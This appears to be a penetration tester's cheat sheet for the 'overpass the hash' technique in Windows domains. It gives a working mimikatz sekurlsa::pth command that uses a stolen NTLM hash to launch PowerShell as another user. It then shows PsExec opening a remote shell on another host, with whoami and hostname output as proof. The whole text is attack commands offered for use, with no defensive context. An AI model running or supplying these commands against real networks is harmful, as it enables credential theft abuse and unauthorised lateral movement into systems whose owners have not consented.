# OVERPASS THE HASH
#mimikatz 
```
sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[ntlm hash] /run:powershell

# OVERPASS THE HASH

# to abuse use anything that uses kerberos tickets, for example
cd C:\tools\SysinternalsSuite\
.\PsExec.exe \\[host] cmd
	whoami
		[domain]\[user]
	hostname
		[hostname]

```